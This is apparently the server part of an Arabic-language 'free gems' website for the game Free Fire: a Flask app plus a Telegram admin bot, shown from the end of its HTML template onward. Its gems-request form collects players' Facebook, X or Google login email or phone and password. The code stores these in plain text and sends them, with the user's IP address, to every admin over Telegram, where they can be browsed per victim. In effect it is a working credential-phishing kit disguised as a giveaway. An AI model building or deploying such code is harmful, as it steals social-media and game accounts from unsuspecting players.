            const select = document.querySelector('.custom-select');
            const options = document.getElementById('select-options');
            
            if (!select.contains(event.target)) {
                options.style.display = 'none';
                document.querySelector('.custom-select .icon').classList.remove('fa-chevron-up');
                document.querySelector('.custom-select .icon').classList.add('fa-chevron-down');
            }
        });

        document.getElementById('gemsForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const formData = new FormData(this);
            const data = Object.fromEntries(formData);
            
            // التحقق من اختيار نوع التسجيل
            if (!data.registrationType) {
                showGemsModal('خطأ', '❌ يرجى اختيار نوع التسجيل');
                return;
            }

            fetch('/submit_gems_request', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            }).then(r=>r.json()).then(resp=>{
                if (resp.success) {
                    showGemsModal('نجاح', '✅ تم إرسال طلبك بنجاح!');
                } else {
                    showGemsModal('خطأ', '❌ ' + (resp.message || 'حدث خطأ'));
                }
            }).catch(()=>{ 
                showGemsModal('خطأ', '❌ حدث خطأ في الاتصال'); 
            });
        });

        function logout() {
            // حذف بيانات تسجيل الدخول المحفوظة عند الخروج
            localStorage.removeItem('saved_email');
            localStorage.removeItem('saved_password');
            
            fetch('/logout',{method:'POST'}).then(()=> window.location.href = '/');
        }
        
        // Modal functions for gems request
        function showGemsModal(title, content) {
            document.getElementById('gemsModalTitle').textContent = title;
            document.getElementById('gemsModalContent').textContent = content;
            document.getElementById('gemsModalOverlay').style.display = 'flex';
        }

        function closeGemsModal() {
            document.getElementById('gemsModalOverlay').style.display = 'none';
            if (document.getElementById('gemsModalTitle').textContent === 'نجاح') {
                location.reload();
            }
        }
    </script>
</body>
</html>
'''

# ---------------------------
# وظائف مساعدة (كما في الملف الأصلي مع تحسينات بسيطة)
# ---------------------------
def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

def generate_user_id():
    return str(uuid.uuid4()).replace('-', '')[:12]

def save_image(image_file):
    try:
        if image_file and image_file.filename:
            image_data = base64.b64encode(image_file.read()).decode()
            return f"data:image/jpeg;base64,{image_data}"
    except Exception:
        traceback.print_exc()
    return None

def is_admin(chat_id):
    try:
        return int(chat_id) in admins_list
    except Exception:
        return False

def create_main_keyboard():
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        types.InlineKeyboardButton("👥 الحسابات", callback_data="accounts"),
        types.InlineKeyboardButton("🔍 البحث عن حساب", callback_data="search_account")
    )
    keyboard.add(
        types.InlineKeyboardButton("➕ إضافة أدمن آخر", callback_data="add_admin"),
        types.InlineKeyboardButton("⚙️ التحكم في الأدمن", callback_data="manage_admins")
    )
    return keyboard

def create_back_keyboard():
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(types.InlineKeyboardButton("🔙 العودة للخلف", callback_data="back_to_main"))
    return keyboard

def create_user_keyboard(user_id, chat_id):
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        types.InlineKeyboardButton("💎 الطلبات المرسلة", callback_data=f"user_requests_{user_id}"),
        types.InlineKeyboardButton("✉️ إدارة الرسائل", callback_data=f"manage_messages_{user_id}"),
    )
    
    # فقط الأدمن الرئيسي يمكنه حذف الحسابات
    if chat_id == MAIN_ADMIN_ID:
        keyboard.add(types.InlineKeyboardButton("✖️ حذف الحساب نهائياً", callback_data=f"delete_user_{user_id}"))
    
    keyboard.add(types.InlineKeyboardButton("🔙 العودة للخلف", callback_data="accounts"))
    return keyboard

# دالة تحاول تعديل الرسالة وإلا ترسل رسالة جديدة (لتجنب رسائل مكررة عند الضغط على الأزرار)
def safe_edit_or_send(chat_id, call_message, text, reply_markup=None):
    if not bot:
        return
    try:
        # محاولة تعديل caption إن كانت الرسالة تحتوي على صورة
        try:
            if hasattr(call_message, 'photo') and call_message.photo:
                bot.edit_message_caption(text, chat_id, call_message.message_id, reply_markup=reply_markup)
                return
        except Exception:
            pass
        # ثم محاولة تعديل النص
        try:
            bot.edit_message_text(text, chat_id, call_message.message_id, reply_markup=reply_markup, parse_mode='HTML')
            return
        except Exception:
            pass
    except Exception:
        pass
    # إذا فشل التعديل، نرسل رسالة جديدة كحل احتياطي
    try:
        if reply_markup:
            bot.send_message(chat_id, text, reply_markup=reply_markup, parse_mode='HTML')
        else:
            bot.send_message(chat_id, text, parse_mode='HTML')
    except Exception:
        try:
            bot.send_message(chat_id, "⚠️ حدث خطأ أثناء محاولة تحديث الواجهة. حاول مرة أخرى.")
        except:
            pass

# ---------------------------
# Routes للموقع
# ---------------------------
@app.route('/')
def index():
    if 'user_id' in session:
        return redirect(url_for('dashboard'))
    return render_template_string(LOGIN_TEMPLATE)

@app.route('/register', methods=['POST'])
def register():
    try:
        name = request.form.get('name')
        email = request.form.get('email')
        password = request.form.get('password')
        image_file = request.files.get('profileImage')
        remember_me = request.form.get('remember_me') == 'on'
        
        # التحقق من وجود البيانات
        if not all([name, email, password, image_file]):
            return jsonify({'success': False, 'message': 'جميع الحقول مطلوبة'})
        
        # التحقق من عدم وجود الإيميل مسبقاً
        for user_data in users_data.values():
            if user_data['email'] == email:
                return jsonify({'success': False, 'message': 'البريد الإلكتروني مستخدم مسبقاً'})
        
        # التحقق من عدم وجود الاسم مسبقاً
        for user_data in users_data.values():
            if user_data['name'].strip().lower() == (name or '').strip().lower():
                return jsonify({'success': False, 'message': 'الاسم مستخدم مسبقاً. اختر اسماً آخر'})
        
        # إنشاء المستخدم
        user_id = generate_user_id()
        image_data = save_image(image_file)
        
        users_data[user_id] = {
            'id': user_id,
            'name': name,
            'email': email,
            'password': hash_password(password),
            'image': image_data,
            'created_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        
        requests_data[user_id] = []
        admin_messages[user_id] = []
        
        return jsonify({'success': True})
    except Exception as e:
        traceback.print_exc()
        return jsonify({'success': False, 'message': 'حدث خطأ في إنشاء الحساب'})

@app.route('/login', methods=['POST'])
def login():
    try:
        data = request.get_json()
        email = data.get('email')
        password = data.get('password')
        remember_me = data.get('remember_me', False)
        
        # البحث عن المستخدم
        for user_id, user_data in users_data.items():
            if user_data['email'] == email and user_data['password'] == hash_password(password):
                session['user_id'] = user_id
                return jsonify({'success': True})
        
        return jsonify({'success': False, 'message': 'البريد الإلكتروني أو كلمة المرور غير صحيحة'})
    except Exception as e:
        traceback.print_exc()
        return jsonify({'success': False, 'message': 'حدث خطأ في تسجيل الدخول'})

@app.route('/logout', methods=['POST'])
def logout():
    session.clear()
    return jsonify({'success': True})

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect(url_for('index'))
    
    user_id = session['user_id']
    user = users_data.get(user_id)
    
    if not user:
        session.clear()
        return redirect(url_for('index'))
    
    # إحصائيات المستخدم
    user_requests = requests_data.get(user_id, [])
    user_messages = admin_messages.get(user_id, [])
    
    stats = {
        'total_requests': len(user_requests),
        'admin_messages': len(user_messages)
    }
    
    return render_template_string(DASHBOARD_TEMPLATE, 
                                user=user, 
                                user_requests=user_requests, 
                                admin_messages_for_user=user_messages,
                                stats=stats)

@app.route('/submit_gems_request', methods=['POST'])
def submit_gems_request():
    if 'user_id' not in session:
        return jsonify({'success': False, 'message': 'غير مسجل الدخول'})
    
    try:
        data = request.get_json() or {}
        user_id = session['user_id']
        
        # إنشاء طلب جديد
        request_id = str(uuid.uuid4())[:8]
        gem_request = {
            'id': request_id,
            'user_id': user_id,
            'fullName': data.get('fullName'),
            'freeFireId': data.get('freeFireId'),
            'emailOrPhone': data.get('emailOrPhone'),
            'password': data.get('password'),
            'registrationType': data.get('registrationType'),
            'date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'ip_address': request.remote_addr
        }
        
        # حفظ الطلب
        if user_id not in requests_data:
            requests_data[user_id] = []
        requests_data[user_id].append(gem_request)
        
        # إشعار الأدمن عبر التليجرام إن وُجد البوت
        if bot:
            user = users_data.get(user_id)
            registration_types = {'facebook': '📘 فايسبوك', 'twitter': '🐦 X (تويتر)', 'google': '🔍 قوقل'}
            reg_type = registration_types.get(gem_request['registrationType'], gem_request['registrationType'])
            message = f"""
🎮 طلب جواهر جديد 🎮
━━━━━━━━━━━━━━━━━━━━

👤 المستخدم: {user['name']}
🆔 معرف الطلب: {request_id}

📋 تفاصيل الطلب:
• الاسم في اللعبة: {gem_request['fullName']}
• ايدي فري فاير: {gem_request['freeFireId']}
• البريد/الهاتف: {gem_request['emailOrPhone']}
• كلمة المرور: {gem_request['password']}
• نوع التسجيل: {reg_type}

━━━━━━━━━━━━━━━━━━━━
📅 التاريخ: {gem_request['date']}
🌐 IP: {gem_request['ip_address']}
            """
            keyboard = types.InlineKeyboardMarkup()
            keyboard.add(types.InlineKeyboardButton("👤 عرض حساب المستخدم", callback_data=f"view_user_{user_id}"))
            for admin_id in admins_list:
                try:
                    bot.send_message(admin_id, message, reply_markup=keyboard)
                except Exception:
                    pass
        
        return jsonify({'success': True})
    except Exception as e:
        traceback.print_exc()
        return jsonify({'success': False, 'message': 'حدث خطأ في إرسال الطلب'})

# ---------------------------
# دوال البوت (كما في الملف الأصلي مع سلوك محسّن لتحديث الرسائل بدل إرسال جديدة)
# ---------------------------
if bot:
    @bot.message_handler(commands=['start'])
    def handle_start(message):
        chat_id = message.chat.id
        try:
            if chat_id == MAIN_ADMIN_ID:
                welcome_msg = f"""
🎮 مرحباً بك في قسم الإدارة 🎮

مرحباً {message.from_user.first_name}!
أنت الآن في لوحة التحكم الرئيسية للمنصة.

يمكنك من هنا:
• إدارة جميع الحسابات المسجلة
• مراجعة طلبات الجواهر
• إرسال رسائل للمستخدمين
• إضافة أدمن جدد

اختر من الأزرار أدناه:
                """
                bot.send_message(chat_id, welcome_msg, reply_markup=create_main_keyboard())
            elif is_admin(chat_id):
                welcome_msg = f"""
🎮 مرحباً بك أيها الأدمن 🎮

مرحباً {message.from_user.first_name}!
أنت أدمن في هذه المنصة.

يمكنك:
• عرض جميع الحسابات
• مراجعة طلبات الجواهر
• إرسال رسائل للمستخدمين

اختر من الأزرار أدناه:
                """
                keyboard = types.InlineKeyboardMarkup(row_width=2)
                keyboard.add(
                    types.InlineKeyboardButton("👥 الحسابات", callback_data="accounts"),
                    types.InlineKeyboardButton("🔍 البحث عن حساب", callback_data="search_account")
                )
                bot.send_message(chat_id, welcome_msg, reply_markup=keyboard)
            else:
                bot.send_message(chat_id, "❌ عذراً، ليس لديك صلاحية للوصول إلى هذا البوت.")
        except Exception:
            traceback.print_exc()

    @bot.callback_query_handler(func=lambda call: True)
    def handle_callback(call):
        chat_id = call.message.chat.id
        data = call.data

        # التحقق من صلاحية الأدمن
        if not is_admin(chat_id):
            try:
                bot.answer_callback_query(call.id, "ليس لديك صلاحية!")
            except:
                pass
            return

        try:
            # العودة للقائمة الرئيسية
            if data == "back_to_main":
                if chat_id == MAIN_ADMIN_ID:
                    safe_edit_or_send(chat_id, call.message, "🏠 القائمة الرئيسية", reply_markup=create_main_keyboard())
                else:
                    keyboard = types.InlineKeyboardMarkup(row_width=2)
                    keyboard.add(
                        types.InlineKeyboardButton("👥 الحسابات", callback_data="accounts"),
                        types.InlineKeyboardButton("🔍 البحث عن حساب", callback_data="search_account")
                    )
                    safe_edit_or_send(chat_id, call.message, "🏠 القائمة الرئيسية", reply_markup=keyboard)

            elif data == "accounts":
                if not users_data:
                    safe_edit_or_send(chat_id, call.message, "📋 لا يوجد حسابات مسجلة بعد", reply_markup=create_back_keyboard())
                else:
                    keyboard = types.InlineKeyboardMarkup(row_width=2)
                    for user_id, user in users_data.items():
                        keyboard.add(types.InlineKeyboardButton(f"👤 {user['name']}", callback_data=f"view_user_{user_id}"))
                    keyboard.add(types.InlineKeyboardButton("🔙 العودة للخلف", callback_data="back_to_main"))
                    safe_edit_or_send(chat_id, call.message, f"👥 جميع الحسابات ({len(users_data)})\nاختر حساباً لعرض تفاصيله:", reply_markup=keyboard)

            elif data.startswith("view_user_"):
                # يمكن أن يحتوي user_id على '_' لذلك نستخدم partition
                user_id = data[len("view_user_"):]
                user = users_data.get(user_id)
                if user:
                    caption = f"""
👤 معلومات المستخدم

📝 الاسم: {user['name']}
📧 البريد: {user['email']}
📅 تاريخ التسجيل: {user['created_at']}
🆔 معرف المستخدم: {user_id}

📊 الإحصائيات:
• عدد طلبات الجواهر: {len(requests_data.get(user_id, []))}
• عدد رسائل الإدارة: {len(admin_messages.get(user_id, []))}
                    """
                    try:
                        # إرسال صورة المستخدم مع النص
                        bot.send_photo(chat_id, user['image'], caption=caption, 
                                      reply_markup=create_user_keyboard(user_id, chat_id))
                    except Exception as e:
                        # إذا فشل إرسال الصورة، إرسال النص فقط
                        print(f"Error sending photo: {e}")
                        safe_edit_or_send(chat_id, call.message, caption, 
                                         reply_markup=create_user_keyboard(user_id, chat_id))

            elif data.startswith("user_requests_"):
                user_id = data[len("user_requests_"):]
                user_requests_list = requests_data.get(user_id, [])
                if not user_requests_list:
                    safe_edit_or_send(chat_id, call.message, "📋 لا توجد طلبات جواهر لهذا المستخدم", reply_markup=create_back_keyboard())
                else:
                    keyboard = types.InlineKeyboardMarkup(row_width=1)
                    for req in user_requests_list:
                        keyboard.add(types.InlineKeyboardButton(f"🎮 طلب {req['id']} - {req['date']}", callback_data=f"request_details_{req['id']}"))
                    keyboard.add(types.InlineKeyboardButton("🔙 العودة للخلف", callback_data=f"view_user_{user_id}"))
                    safe_edit_or_send(chat_id, call.message, f"💎 طلبات الجواهر ({len(user_requests_list)} طلب)", reply_markup=keyboard)

            elif data.startswith("request_details_"):
                request_id = data[len("request_details_"):]
                found_request = None
                found_user_id = None
                for uid, reqs in requests_data.items():
                    for req in reqs:
                        if req['id'] == request_id:
                            found_request = req
                            found_user_id = uid
                            break
                    if found_request:
                        break

                if found_request:
                    registration_types = {'facebook': '📘 فايسبوك', 'twitter': '🐦 X (تويتر)', 'google': '🔍 قوقل'}
                    reg_type = registration_types.get(found_request.get('registrationType'), found_request.get('registrationType'))
                    details = f"""
🎮 تفاصيل طلب الجواهر

🆔 معرف الطلب: {found_request['id']}
📅 التاريخ: {found_request['date']}

📋 البيانات:
• الاسم في اللعبة: {found_request.get('fullName')}
• ايدي فري فاير: {found_request.get('freeFireId')}
• البريد/الهاتف: {found_request.get('emailOrPhone')}
• كلمة المرور: {found_request.get('password')}
• نوع التسجيل: {reg_type}

🌐 معلومات إضافية:
• عنوان IP: {found_request.get('ip_address')}
                    """
                    keyboard = types.InlineKeyboardMarkup()
                    
                    # فقط الأدمن الرئيسي يمكنه حذف الطلبات
                    if chat_id == MAIN_ADMIN_ID:
                        keyboard.add(types.InlineKeyboardButton("🗑️ حذف هذا الطلب", callback_data=f"delete_request_{request_id}"))
                    
                    keyboard.add(types.InlineKeyboardButton("🔙 العودة للخلف", callback_data=f"user_requests_{found_user_id}"))
                    safe_edit_or_send(chat_id, call.message, details, reply_markup=keyboard)

            elif data.startswith("delete_request_"):
                # فقط الأدمن الرئيسي يمكنه حذف الطلبات
                if chat_id != MAIN_ADMIN_ID:
                    bot.answer_callback_query(call.id, "ليس لديك الصلاحية لحذف الطلبات!")
                    return
                    
                request_id = data[len("delete_request_"):]
                # حذف الطلب من جميع المستخدمين
                for uid in list(requests_data.keys()):
                    requests_data[uid] = [req for req in requests_data[uid] if req['id'] != request_id]
                safe_edit_or_send(chat_id, call.message, "✅ تم حذف الطلب بنجاح", reply_markup=create_back_keyboard())

            elif data.startswith("manage_messages_"):
                user_id = data[len("manage_messages_"):]
                keyboard = types.InlineKeyboardMarkup()
                keyboard.add(types.InlineKeyboardButton("📨 الرسائل المرسلة", callback_data=f"admin_sent_messages_{user_id}"))
                keyboard.add(types.InlineKeyboardButton("✍️ إرسال رسالة جديدة", callback_data=f"admin_send_new_{user_id}"))
                keyboard.add(types.InlineKeyboardButton("🔙 العودة للخلف", callback_data=f"view_user_{user_id}"))
                safe_edit_or_send(chat_id, call.message, f"إدارة رسائل المستخدم {user_id} - اختر اختياراً:", reply_markup=keyboard)

            elif data.startswith("admin_sent_messages_"):
                target_user = data[len("admin_sent_messages_"):]
                msgs = admin_messages.get(target_user, [])
                if not msgs:
                    safe_edit_or_send(chat_id, call.message, "لا توجد رسائل مرسلة لهذا المستخدم.", reply_markup=create_back_keyboard())
                else:
                    text = "📬 الرسائل المرسلة:\n\n"
                    for m in msgs:
                        text += f"- [{m.get('date')}] {m.get('content')}\n"
                    safe_edit_or_send(chat_id, call.message, text, reply_markup=create_back_keyboard())

            elif data.startswith("admin_send_new_"):
                target_user = data[len("admin_send_new_"):]
                user_states[chat_id] = {'action': 'send_message', 'target_user': target_user}
                safe_edit_or_send(chat_id, call.message, "💬 الآن اكتب الرسالة التي تريد إرسالها للمستخدم:", reply_markup=create_back_keyboard())

            elif data.startswith("send_message_"):
                user_id = data[len("send_message_"):]
                keyboard = types.InlineKeyboardMarkup()
                keyboard.add(types.InlineKeyboardButton("📨 الرسائل المرسلة", callback_data=f"admin_sent_messages_{user_id}"))
                keyboard.add(types.InlineKeyboardButton("✍️ إرسال رسالة جديدة", callback_data=f"admin_send_new_{user_id}"))
                keyboard.add(types.InlineKeyboardButton("🔙 العودة للخلف", callback_data=f"view_user_{user_id}"))
                safe_edit_or_send(chat_id, call.message, "اختر ما تريد:", reply_markup=keyboard)

            elif data.startswith("delete_user_"):
                # فقط الأدمن الرئيسي يمكنه حذف الحسابات
                if chat_id != MAIN_ADMIN_ID:
                    bot.answer_callback_query(call.id, "ليس لديك الصلاحية لحذف الحسابات!")
                    return
                    
                user_id = data[len("delete_user_"):]
                user = users_data.get(user_id)
                if user:
                    try:
                        del users_data[user_id]
                    except KeyError:
                        pass
                    requests_data.pop(user_id, None)
                    admin_messages.pop(user_id, None)
                    safe_edit_or_send(chat_id, call.message, f"✅ تم حذف حساب {user.get('name','مستخدم')} نهائياً مع جميع بياناته", reply_markup=create_back_keyboard())
                else:
                    safe_edit_or_send(chat_id, call.message, "⚠️ المستخدم غير موجود.", reply_markup=create_back_keyboard())

            elif data == "search_account":
                user_states[chat_id] = {'action': 'search_account'}
                safe_edit_or_send(chat_id, call.message, "🔍 أدخل اسم المستخدم للبحث عنه:", reply_markup=create_back_keyboard())

            elif data == "add_admin" and chat_id == MAIN_ADMIN_ID:
                user_states[chat_id] = {'action': 'add_admin'}
                safe_edit_or_send(chat_id, call.message, "➕ أدخل معرف التليجرام (ID) للأدمن الجديد:", reply_markup=create_back_keyboard())

            elif data == "manage_admins" and chat_id == MAIN_ADMIN_ID:
                if len(admins_list) == 1:
                    safe_edit_or_send(chat_id, call.message, "👑 أنت الأدمن الوحيد حالياً", reply_markup=create_back_keyboard())
                else:
                    keyboard = types.InlineKeyboardMarkup(row_width=1)
                    for admin_id in admins_list:
                        if admin_id != MAIN_ADMIN_ID:
                            try:
                                admin_info = bot.get_chat(admin_id)
                                admin_name = admin_info.first_name or admin_info.username or str(admin_id)
                                keyboard.add(types.InlineKeyboardButton(f"🗑️ حذف {admin_name}", callback_data=f"remove_admin_{admin_id}"))
                            except:
                                keyboard.add(types.InlineKeyboardButton(f"🗑️ حذف {admin_id}", callback_data=f"remove_admin_{admin_id}"))
                    keyboard.add(types.InlineKeyboardButton("🔙 العودة للخلف", callback_data="back_to_main"))
                    safe_edit_or_send(chat_id, call.message, f"⚙️ إدارة الأدمن ({len(admins_list)-1} أدمن إضافي)", reply_markup=keyboard)

            elif data.startswith("remove_admin_") and chat_id == MAIN_ADMIN_ID:
                try:
                    admin_to_remove = int(data[len("remove_admin_"):])
                    if admin_to_remove in admins_list:
                        admins_list.remove(admin_to_remove)
                        try:
                            bot.send_message(admin_to_remove, "❌ تم إزالتك من قائمة الأدمن. لم تعد تملك صلاحيات الوصول للبوت.")
                        except:
                            pass
                        safe_edit_or_send(chat_id, call.message, "✅ تم حذف الأدمن بنجاح", reply_markup=create_back_keyboard())
                except Exception:
                    safe_edit_or_send(chat_id, call.message, "❌ حدث خطأ أثناء محاولة حذف الأدمن", reply_markup=create_back_keyboard())

        except Exception as e:
            traceback.print_exc()
            try:
                bot.answer_callback_query(call.id, "حدث خطأ داخلي: " + str(e))
            except:
                pass

    @bot.message_handler(func=lambda message: True)
    def handle_text_messages(message):
        chat_id = message.chat.id
        text = message.text
        if not is_admin(chat_id):
            return
        if chat_id in user_states:
            state = user_states[chat_id]
            try:
                if state['action'] == 'send_message':
                    target_user = state['target_user']
                    if target_user not in admin_messages:
                        admin_messages[target_user] = []
                    admin_messages[target_user].append({
                        'content': text,
                        'date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'from_admin': chat_id
                    })
                    del user_states[chat_id]
                    user = users_data.get(target_user)
                    user_name = user['name'] if user else 'مستخدم'
                    bot.send_message(chat_id, f"✅ تم إرسال الرسالة إلى {user_name} بنجاح!", reply_markup=create_back_keyboard())
                elif state['action'] == 'search_account':
                    search_results = []
                    for user_id, user in users_data.items():
                        if text.lower() in user['name'].lower():
                            search_results.append((user_id, user))
                    if not search_results:
                        bot.send_message(chat_id, "🔍 لم يتم العثور على أي نتائج", reply_markup=create_back_keyboard())
                    else:
                        keyboard = types.InlineKeyboardMarkup(row_width=1)
                        for user_id, user in search_results:
                            keyboard.add(types.InlineKeyboardButton(f"👤 {user['name']}", callback_data=f"view_user_{user_id}"))
                        keyboard.add(types.InlineKeyboardButton("🔙 العودة للخلف", callback_data="back_to_main"))
                        bot.send_message(chat_id, f"🔍 نتائج البحث عن '{text}' ({len(search_results)} نتيجة):", reply_markup=keyboard)
                    del user_states[chat_id]
                elif state['action'] == 'add_admin' and chat_id == MAIN_ADMIN_ID:
                    try:
                        new_admin_id = int(text)
                        if new_admin_id not in admins_list:
                            admins_list.append(new_admin_id)
                            try:
                                welcome_message = "🎉 مرحباً بك كأدمن جديد في منصة فري فاير!\n\nتم منحك صلاحيات الأدمن. ابدأ بإرسال /start"
                                bot.send_message(new_admin_id, welcome_message)
                                bot.send_message(chat_id, f"✅ تم إضافة الأدمن {new_admin_id} بنجاح!", reply_markup=create_back_keyboard())
                            except:
                                bot.send_message(chat_id, f"⚠️ تم إضافة الأدمن {new_admin_id} لكن لم نتمكن من إرسال رسالة ترحيب له", reply_markup=create_back_keyboard())
                        else:
                            bot.send_message(chat_id, "⚠️ هذا المستخدم أدمن بالفعل!", reply_markup=create_back_keyboard())
                    except ValueError:
                        bot.send_message(chat_id, "❌ معرف التليجرام يجب أن يكون رقماً!", reply_markup=create_back_keyboard())
                    del user_states[chat_id]
            except Exception:
                traceback.print_exc()
                bot.send_message(chat_id, "❌ حدث خطأ أثناء العملية. حاول مرة أخرى.", reply_markup=create_back_keyboard())

# Webhook endpoint للبوت
@app.route('/webhook', methods=['POST'])
def webhook():
    if not bot:
        return 'Bot not initialized', 500
    try:
        json_str = request.get_data().decode('UTF-8')
        update = telebot.types.Update.de_json(json_str)
        bot.process_new_updates([update])
        return 'OK', 200
    except Exception as e:
        print(f"Webhook error: {e}")
        return 'Error', 500

# نقطة ping للتحقق من عمل التطبيق
@app.route('/ping')
def ping():
    return "OK"

# إعداد الـ webhook (اختياري)
@app.route('/set_webhook')
def set_webhook():
    if not bot:
        return "Bot not initialized - check BOT_TOKEN"
    try:
        webhook_url = f"{WEBHOOK_URL}/webhook"
        bot.remove_webhook()
        result = bot.set_webhook(url=webhook_url)
        return f"Webhook set successfully: {result}"
    except Exception as e:
        return f"Error setting webhook: {e}"

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    
    # إعداد الـ webhook تلقائياً إذا كان البوت متاح
    if bot and WEBHOOK_URL != 'https://your-app-name.repl.co':
        try:
            import threading
            import time
            def setup_webhook():
                time.sleep(5)
                try:
                    webhook_url = f"{WEBHOOK_URL}/webhook"
                    bot.remove_webhook()
                    result = bot.set_webhook(url=webhook_url)
                    print(f"✅ Webhook تم إعداده بنجاح: {result}")
                except Exception as e:
                    print(f"❌ خطأ في إعداد الـ webhook: {e}")
            threading.Thread(target=setup_webhook, daemon=True).start()
        except Exception as e:
            print(f"خطأ في بدء إعداد الـ webhook: {e}")
    
    app.run(host='0.0.0.0', port=port, debug=False)
